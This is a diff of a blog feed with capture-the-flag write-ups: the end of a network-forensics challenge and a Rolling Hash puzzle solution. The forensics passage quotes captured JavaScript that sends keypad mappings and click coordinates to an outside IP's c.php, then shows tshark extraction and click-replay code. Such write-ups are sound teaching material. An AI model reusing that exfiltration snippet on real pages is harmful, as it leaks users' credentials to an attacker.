+  &lt;span class=&quot;nx&quot;&gt;xmlhttp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://95.211.102.232:8080/c.php?t=c&amp;amp;v=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;xPosition&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;,&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;yPosition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;xmlhttp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;It first sends the mapping of keys to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://95.211.102.232:8080/c.php&lt;/code&gt; then on each click sends the x and y position of click to that page.&lt;/p&gt;
+
+&lt;p&gt;We used the following shell script to find all GET requests to the given address.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/sh&lt;/span&gt;
+
+touch bank-followstream.txt
+&lt;span class=&quot;nv&quot;&gt;END&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;tshark &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T&lt;/span&gt; fields &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; tcp.stream | sort &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; | tail &lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;i&amp;lt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;END&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;i++&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
+     &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;
+     tshark &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-qz&lt;/span&gt; follow,tcp,ascii,&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; bank-followstream.txt
+&lt;span class=&quot;k&quot;&gt;done
+
+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;GET /c.php&quot;&lt;/span&gt; &amp;lt; bank-followstream.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Key mapping is &lt;code class=&quot;highlighter-rouge&quot;&gt;4    1    6    3    7    0    8    9    5    2   Backspace&lt;/code&gt;. With a simple javascript code you can simulate clicks on the original page. After logging in the flag will appear.
+This line of javascript (using jQuery) code may be helpful:&lt;/p&gt;
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;elementFromPoint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;click&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>mashhadimj</name></author><summary type="html">The police have arrested a cyber criminal but they don’t have a good witness. Just a short capture of his network traffic is available. Is it helpful?</summary></entry><entry><title type="html">SU CTF 2014 – Rolling Hash Write up</title><link href="https://mjafar.me/blog/2014/09/su-ctf-2014-rolling-hash-write-up/" rel="alternate" type="text/html" title="SU CTF 2014 &amp;#8211; Rolling Hash Write up" /><published>2014-09-28T19:26:44+00:00</published><updated>2014-09-28T19:26:44+00:00</updated><id>https://mjafar.me/blog/2014/09/su-ctf-2014-rolling-hash-write-up</id><content type="html" xml:base="https://mjafar.me/blog/2014/09/su-ctf-2014-rolling-hash-write-up/">&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;*********&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;RabinKarpRollingHash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;result = &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;
+
+
+&lt;span class=&quot;n&quot;&gt;RabinKarpRollingHash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;span style=&quot;color: #333333;&quot;&gt;output is
+1317748575983887541099
+What is the flag?&lt;/span&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;Well, the point is 10**30 is a very large number and calculating the modulus has no effect on output. also 256 is a power of 2.&lt;/p&gt;
+
+&lt;p&gt;Given code calculates ASCII code for each character of input and multiplies it in 256 ** (l-i-1) that makes their bits shift (8*k) then adds all results together. So representation of &lt;span style=&quot;color: #333333;&quot;&gt;1317748575983887541099 in binary contains concatenated binary codes of flag in reverse order. 
+I used  &lt;a href=&quot;http://www.onlineconversion.com/base.htm&quot;&gt;this site&lt;/a&gt; to convert this number to binary.&lt;/span&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;chars&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
+  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b01000111&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b01101111&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b01101111&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b01100100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b00100000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b01001100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b01110100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b00000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b00000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Well, that site failed in last bits and this code outputs &lt;strong&gt;‘Good Lt’&lt;/strong&gt; but it’s very easy to guess that flag was &lt;strong&gt;Good Luck&lt;/strong&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;strong&gt;EDIT:&lt;/strong&gt; a better solution for the last step mentioned in comments:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;number&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1317748575983887541099&lt;/span&gt; 
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;number&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>mashhadimj</name></author><summary type="html">```python flag=”*****” def RabinKarpRollingHash( str, a, n ): result = 0 l = len(str) for i in range(0, l): result += ord(str[i]) * a ** (l - i - 1) % n print “result = “, result</summary></entry></feed>
